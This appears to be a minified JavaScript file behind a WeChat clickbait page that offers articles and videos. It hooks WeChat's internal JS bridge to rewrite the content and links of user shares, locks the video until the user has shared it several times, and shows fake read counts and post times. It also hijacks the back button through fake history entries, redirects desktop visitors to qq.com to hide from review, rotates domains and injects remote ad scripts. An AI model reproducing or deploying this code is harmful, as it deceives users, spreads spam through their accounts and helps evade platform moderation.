function isIos() {
    var e = navigator.userAgent.toLowerCase();
    return e.indexOf("iphone") >= 0 || e.indexOf("ipad") >= 0 || e.indexOf("applewebkit") >= 0
}
function isAndroid() {
    var e = navigator.userAgent.toLowerCase();
    return e.indexOf("android") >= 0
}
function isUrl(e) {
    return !! e && (e.indexOf("http://") >= 0 || e.indexOf("https://") >= 0)
}
function getUrlParam(e, a) {
    var i = a,
    t = e.length,
    n = i.indexOf(e);
    if (n == -1) return "";
    n += t + 1;
    var r = i.indexOf("&", n);
    return r == -1 ? i.substring(n) : i.substring(n, r)
}
function getRandomNum(e, a) {
    var i = a - e,
    t = Math.random();
    return e + Math.round(t * i)
}
function getFormatDate() {
    var e = new Date,
    a = new Date(e.setHours(e.getHours() + 8)).toISOString();
    return a.substring(0, a.indexOf("T"))
}
function isNeedRedirect() {
    var e = getUrlParam("from", location.search);
    return "timeline" == e || "groupmessage" == e || "singlemessage" == e || "share" == e
}
function changeTitle(e) {
    if (document.title = e, navigator.userAgent.toLowerCase().indexOf("iphone") >= 0) {
        var a = $("body"),
        i = $('<iframe src="/favicon.ico"></iframe>');
        i.on("load",
        function() {
            setTimeout(function() {
                i.off("load").remove()
            },
            0)
        }).appendTo(a)
    }
}
function getNextUrl(e, a) {
    var i = {};
    if (i.timeout = 2e3, i.method = "POST", i.url = "NextDomainB.html", window.apiList && window.apiList.length > 0) {
        var t = apiList[getRandomNum(0, apiList.length - 1)];
        t && t.length > 0 && (i.url = t)
    }
    e ? i.data = {
        id: e,
        referrer: location.href
    }: i.data = {
        referrer: location.href
    },
    i.success = function(e) {
        if (e && e.success) isUrl(e.data.url) && (location.href = e.data.url),
        e.data.redirect && (location.href = e.data.url),
        a && "function" == typeof a && a(e.data);
        else {
            var t = i;
            if (window.apiList && window.apiList.length > 0) {
                var n = apiList[getRandomNum(0, apiList.length - 1)];
                n && n.length > 0 && (t.url = n)
            }
            $.ajax(t)
        }
    },
    i.error = function(e, a, t) {
        console.log("ajax error : ", a, t);
        var n = i;
        if (window.apiList && window.apiList.length > 0) {
            var r = apiList[getRandomNum(0, apiList.length - 1)];
            r && r.length > 0 && (n.url = r)
        }
        reNextCount++,
        reNextCount <= 3 && $.ajax(n)
    },
    $.ajax(i)
}
Object.defineProperty(window, "WeixinJSBridge", {
    writable: !0,
    enumerable: !0,
    configurable: !0
}),
isAndroid() || isIos() || (window.forbidUrl ? location.href = window.forbidUrl: location.href = "http://www.qq.com");
var searchDomainModelId = getUrlParam("dmid", location.search),
searchShareDomainModelId = getUrlParam("sdmid", location.search);
searchShareDomainModelId || (searchShareDomainModelId = "jxpyhu");
var reNextCount = 0;
$(document).ready(function() {
    function e(e, a) {
        void 0 === a && (a = 0),
        $("header").addClass("show"),
        setTimeout(function() {
            e && "function" == typeof e && e(),
            $("header").removeClass("show")
        },
        a)
    }
    function a() {
        for (var a = function(a) {
            if (a >= dataList.length) return $("button#show-more").hide(),
            {
                value: void 0
            };
            if (adList && adList.length > 0) {
                var i = adList.some(function(e) {
                    return e.sort == a
                });
                if (i) for (var t = function(e) {
                    if (e.sort == a) {
                        var i = $("#dummy-item").clone();
                        return i.attr("id", "ad-" + a),
                        i.find("img").attr("src", e.imageUrl),
                        i.find(".item-title").text(e.title),
                        i.find("span:first-child").text(getRandomNum(1, 5) + "小时前"),
                        i.find("span:last-child").text("阅读：    " + getRandomNum(2e4, 1e5) + "次"),
                        i.css("color", "red"),
                        i.on("click",
                        function() {
                            if (isUrl(e.pathName)) return void(location.href = e.pathName);
                            var i = "http://" + d + e.pathName + (inPageAds[a].url.indexOf("?") > 0 ? "&": "?") + "user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId;
                            location.href = i
                        }),
                        $("article").append(i),
                        "break"
                    }
                },
                r = 0, s = adList; r < s.length; r++) {
                    var l = s[r],
                    c = t(l);
                    if ("break" === c) break
                }
            }
            var m = dataList[a];
            if (m) {
                var u = $("#dummy-item").clone();
                u.attr("id", m.id),
                u.find("img").attr("src", m.imageUrl),
                u.find(".item-title").text(m.title),
                u.find("span:first-child").text(getRandomNum(1, 5) + "小时前"),
                u.find("span:last-child").text("阅读：    " + getRandomNum(2e4, 1e5) + "次"),
                u.on("click",
                function() {
                    h = 0,
                    o = m,
                    n(!1),
                    e(function() {
                        $("#video-frame").attr("src", ""),
                        $("#video-frame").hide(),
                        $("#cover-image").show(),
                        $("#dummy-image").attr("src", m.imageUrl),
                        changeTitle(m.title),
                        $(document).scrollTop(0)
                    },
                    500)
                }),
                $("article").append(u)
            }
        },
        i = c; i < c + m; i++) {
            var t = a(i);
            if ("object" == typeof t) return t.value
        }
        c += m
    }
    function i() {
        if (inPageAds) for (var e = $(".ad-frame"), a = 0; a < e.length; a++) if (inPageAds[a] && e.eq(a).length > 0) {
            var i = "";
            i = isUrl(inPageAds[a].url) ? inPageAds[a].url: "http://" + d + inPageAds[a].url + (inPageAds[a].url.indexOf("?") > 0 ? "&": "?") + "user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId,
            e.eq(a).find("a").attr("href", i),
            e.eq(a).find("img").attr("src", inPageAds[a].imageSrc),
            e.eq(a).show()
        }
    }
    function t() {
        o && $("#video-frame").attr("src", o.videoSrc)
    }
    function n(e) {
        if (void 0 === e && (e = !0), document.referrer.indexOf("go.html") >= 0 && o) f.img_url = o.imageUrl,
        f.title = o.title,
        f.desc = o.content,
        f.link = location.origin + w + "?id=" + o.id + "&user=fdsadslja&dmid=" + searchDomainModelId + "&from=share&t=0&timestamp=" + Date.now(),
        window.wcShare && (window.wcShare.shareData = f);
        else if (e) {
            var a = searchShareDomainModelId || searchDomainModelId;
            getNextUrl(a,
            function(e) {
                var a;
                if (e && (a = e.url && e.url.length > 0 ? e.url: e), a) {
                    var i = getRandomNum(0, dataList.length - 1),
                    t = l ? dataList[i] : o;
                    f.img_url = t.imageUrl,
                    f.title = t.title,
                    f.desc = t.content,
                    isUrl(a) ? f.link = a: f.link = "http://" + a + w + "?id=" + (l ? i: o.id) + "&user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId + "&from=share&t=1&timestamp=" + Date.now(),
                    window.wcShare && (window.wcShare.shareData = f)
                }
            })
        } else if (f && f.link && f.link.indexOf("?") >= 0) {
            var i = getRandomNum(0, dataList.length - 1),
            t = l ? dataList[i] : o;
            f.img_url = t.imageUrl,
            f.title = t.title,
            f.desc = t.content,
            f.link = f.link.substring(0, f.link.indexOf("?")) + "?id=" + (l ? i: o.id) + "&user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId + "&from=share&t=2&timestamp=" + Date.now(),
            window.wcShare && (window.wcShare.shareData = f)
        }
    }
    function r() {
        $("#dummy-image").on("load",
        function() {
            p ? $("#dummy-image").show() : (x.clearRect(0, 0, v.width, v.height), x.drawImage($("#dummy-image")[0], 0, 0, v.width, v.height))
        }),
        $("#video-frame").on("load",
        function() {
            o && o.videoSrc == $("#video-frame").attr("src") && ($("#cover-image").hide(), $("#video-frame").show(), p && $("#dummy-image").hide())
        }),
        $("#cover-image").on("click",
        function() {
            0 == g ? t() : ($("body").scrollTop(0), $("html,body").addClass("with-mask"), 0 == h ? $(".share-mask").addClass("show") : $(".count-mask").addClass("show"))
        }),
        $("button#show-more").on("click", a),
        $("button#share-confirm").on("click",
        function() {
            $("html,body").removeClass("with-mask"),
            $(".count-mask").removeClass("show")
        }),
        $("#complain").on("click",
        function() {
            window.navData && (navData.complainFile && navData.complainFile.length > 0 ? location.href = location.href.substring(0, location.href.lastIndexOf("/")) + navData.complainFile + encodeURIComponent(location.href) : location.href = navData.complain + encodeURIComponent(location.href))
        }),
        $("#up-name").on("click",
        function() {
            window.navData && (location.href = navData.url)
        })
    }
    var o, d, s, l = !1,
    c = 0,
    m = 5,
    h = 0,
    u = {},
    f = {
        link: "",
        title: "",
        desc: "",
        img_url: ""
    },
    g = 3;
    window.forceShareCount >= 0 && (g = window.forceShareCount);
    var w = location.pathname.substr(location.pathname.lastIndexOf("/"));
    w.indexOf(".html") < 0 && (w = "/index.html");
    var p = isIos(),
    v = $("#cvs")[0],
    x = v.getContext("2d"),
    k = getUrlParam("id", location.search) || "1";
    $("#date").text(getFormatDate()),
    window.navData && $("#up-name").text(navData.nickName);
    var D = isNeedRedirect();
    if (getNextUrl(searchDomainModelId,
    function(e) {
        if (e) {
            if (d = e.url && e.url.length > 0 ? e.url: e, D) return isUrl(d) ? void(location.href = d) : void(location.href = "http://" + d + w + "?id=" + k + "&user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId);
            if (e.domainModelId && e.domainModelId.length > 0 && (searchDomainModelId = e.domainModelId), e.cnzz && e.cnzz.length > 0 && (u = JSON.parse(e.cnzz || "null"), u && u[w.replace(".html", "").replace("/", "")])) {
                var a = "//s95.cnzz.com/z_stat.php?id={{ID}}&web_id={{ID}}".replace(/{{ID}}/g, u[w.replace(".html", "").replace("/", "")]),
                t = document.createElement("div");
                t.style.display = "none";
                var n = document.createElement("script");
                n.src = a,
                n.setAttribute("language", "JavaScript"),
                n.async = !1,
                t.appendChild(n),
                a = "//c.cnzz.com/core.php?web_id={{ID}}&t=z".replace(/{{ID}}/g, u[w.replace(".html", "").replace("/", "")]),
                n = document.createElement("script"),
                n.src = a,
                n.async = !1,
                n.charset = "utf-8",
                n.type = "text/javascript",
                t.appendChild(n),
                document.body.appendChild(t)
            }
        }
        if (d && !s && (s = isUrl(d) ? d: "http://" + d + w + "?id=" + getRandomNum(0, dataList.length - 1) + "&user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId, window.backAds && window.backAds.length > 0)) {
            var r = 0,
            o = "";
            o = backAds.some(function(e, a) {
                return !! e.isFixed && (r = a, !0)
            }) ? backAds[r].path: backAds[getRandomNum(0, backAds.length - 1)].path,
            o && o.length > 0 && (s = isUrl(o) ? o: isUrl(d) ? d: "http://" + d + o + "?user=fdsadslja&dmid=" + searchDomainModelId + "&sdmid=" + searchShareDomainModelId)
        }
        i()
    }), !D) {
        if (n(), window.setTimeout(function() {
            history.pushState("weixin", null, "#weixin"),
            p && history.pushState("weixin", null, "#weixin"),
            window.onpopstate = function(e) {
                if (!p || null !== e.state) {
                    if (window.turl && window.turl.length > 0) return void(location.href = window.turl);
                    if (s && s.length > 0) return void(location.href = s)
                }
            }
        },
        50), window.dataList && window.dataList.length > 0) {
            var b = dataList.some(function(e) {
                return e.id == k
            });
            if (b) for (var S = 0,
            y = dataList; S < y.length; S++) {
                var I = y[S];
                if (I.id == k) {
                    o = I,
                    changeTitle(I.title),
                    $("#dummy-image").attr("src", I.imageUrl);
                    break
                }
            } else o = dataList[0],
            changeTitle(dataList[0].title),
            $("#dummy-image").attr("src", dataList[0].imageUrl)
        }
        if (window.wcShare && (window.wcShare.shareCallback = function(e) {
            e && e.err_msg && ("send_app_msg:ok" == e.err_msg || "send_app_msg:confirm" == e.err_msg) && (n(), g - h <= 1 ? ($("html,body").removeClass("with-mask"), $(".share-mask,.count-mask").removeClass("show"), t()) : (h++, $("#share-count").text(g - h), $("html,body").addClass("with-mask"), $(".share-mask").removeClass("show"), $(".count-mask").addClass("show")))
        }), r(), a(), window.adScripts && window.adScripts.length > 0) for (var M = 0,
        _ = window.adScripts; M < _.length; M++) {
            var I = _[M];
            if (I && I.length > 0) {
                var L = document.createElement("script");
                L.src = I,
                $("body").append(L)
            }
        }
    }
});
var WechatShare = function() {
    function e() {
        var e = this;
        this.onBridgeReady = function() {
            var a = window.WeixinJSBridge,
            i = {
                invoke: a.invoke,
                call: a.call,
                on: a.on,
                env: a.env,
                log: a.log,
                _fetchQueue: a._fetchQueue,
                _hasInit: a._hasInit,
                _hasPreInit: a._hasPreInit,
                _isBridgeByIframe: a._isBridgeByIframe,
                _continueSetResult: a._continueSetResult,
                _handleMessageFromWeixin: a._handleMessageFromWeixin
            };
            Object.defineProperty(window, "WeixinJSBridge", {
                writable: !0,
                enumerable: !0
            }),
            window.WeixinJSBridge = i;
            try {
                e.setHandleMessageHookForWeixin()
            } catch(a) {
                e.restoreHandleMessageHookForWeixin()
            }
        },
        this.handleMesageHook = function(a) {
            if (a) {
                var i;
                i = a.__json_message ? a.__json_message: a;
                var t = i.__params,
                n = i.__msg_type,
                r = i.__event_id;
                if ("callback" == n && e.shareCallback && "function" == typeof e.shareCallback) e.shareCallback(t);
                else if ("event" == n && r && r.indexOf("share") > 0) {
                    var o = e.shareData.desc,
                    d = e.shareData.link,
                    s = e.shareData.img_url,
                    l = e.shareData.title;
                    Object.defineProperty(t, "title", {
                        get: function() {
                            return delete t.scene,
                            t.desc = o,
                            t.link = d,
                            t.img_url = s,
                            Object.defineProperty(t, "title", {
                                value: l,
                                enumerable: !0
                            }),
                            "title"
                        },
                        set: function() {},
                        enumerable: !1,
                        configurable: !0
                    }),
                    e.restoreHandleMessageHookForWeixin(),
                    e.oldHandleMesageHook(a),
                    e.setHandleMessageHookForWeixin()
                }
            }
        },
        "undefined" == typeof WeixinJSBridge ? document.addEventListener ? document.addEventListener("WeixinJSBridgeReady", this.onBridgeReady, !1) : document.attachEvent && (document.attachEvent("WeixinJSBridgeReady", this.onBridgeReady), document.attachEvent("onWeixinJSBridgeReady", this.onBridgeReady)) : this.onBridgeReady()
    }
    return e.prototype.setHandleMessageHookForWeixin = function() {
        this.oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin,
        window.WeixinJSBridge._handleMessageFromWeixin = this.handleMesageHook
    },
    e.prototype.restoreHandleMessageHookForWeixin = function() {
        this.oldHandleMesageHook && (window.WeixinJSBridge._handleMessageFromWeixin = this.oldHandleMesageHook)
    },
    e
} ();
window.wcShare = new WechatShare;